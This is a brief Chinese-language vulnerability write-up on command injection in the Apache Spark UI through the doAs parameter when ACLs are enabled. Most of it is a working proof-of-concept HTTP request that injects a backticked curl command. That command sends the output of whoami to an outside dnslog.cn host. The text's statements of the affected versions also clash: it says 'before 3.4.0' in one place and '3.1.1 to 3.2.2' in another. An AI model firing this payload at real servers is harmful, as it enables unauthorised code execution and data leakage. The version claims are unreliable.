## 介绍
Apache Spark是美国阿帕奇（Apache）基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。

Apache Spark 3.4.0之前版本存在命令注入漏洞，该漏洞源于如果ACL启用后，HttpSecurityFilter中的代码路径可以允许通过提供任意用户名来执行模拟，这将导致任意shell命令执行。

## 漏洞版本
3.1.1 <= Apache Spark < 3.2.2

## 利用条件
Apache Spark UI 启用 ACL ，且低权限

## 漏洞poc
```
GET /jobs/?doAs=`curl+$(whoami)hw9y0l.dnslog.cn` HTTP/1.1
Host: 10.211.55.7:4040
Connection: keep-alive
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0  Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```
